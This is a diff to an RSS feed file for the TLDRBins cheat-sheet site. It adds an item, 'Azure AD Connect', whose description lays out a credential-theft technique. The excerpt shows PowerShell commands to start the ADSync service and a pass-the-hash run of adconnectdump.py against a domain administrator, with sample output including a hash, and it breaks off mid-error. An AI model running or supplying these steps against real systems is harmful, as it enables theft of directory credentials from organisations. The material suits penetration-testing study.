@@ -6,7 +6,15 @@
     <description>Recent content in Password on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
+    <lastBuildDate>Sat, 23 Nov 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://tldrbins.github.io/@password/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Azure AD Connect</title>
+      <link>https://tldrbins.github.io/azure_ad/</link>
+      <pubDate>Sat, 23 Nov 2024 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/azure_ad/</guid>
+      <description>Abuse #1: Azure AD Connect Password Extraction Windows 1. Start ADSync Service Set-Service -name adsync -StartupType automatic Set-Service -name adsync -status running -passthru Set-Service -name adsync -status running -passthru WARNING: Waiting for service &amp;#39;Microsoft Azure AD Sync (adsync)&amp;#39; to start... Status Name DisplayName ------ ---- ----------- Running adsync Microsoft Azure AD Sync 2. Download ADSync.mdf and ADSync_log.LDF python3 adconnectdump.py &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; $ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509 Azure AD Connect remote credential dumper - by @_dirkjan [*] Stopping service ADSync [*] Downloading ADSync database files [*] Starting service ADSync [*] Querying database for configuration data [-] RemoteOperations failed: [Errno 2] No such file or directory: &amp;#39;ADSyncQuery.</description>
+    </item>
     <item>
       <title>DPAPI</title>
       <link>https://tldrbins.github.io/dpapi/</link>
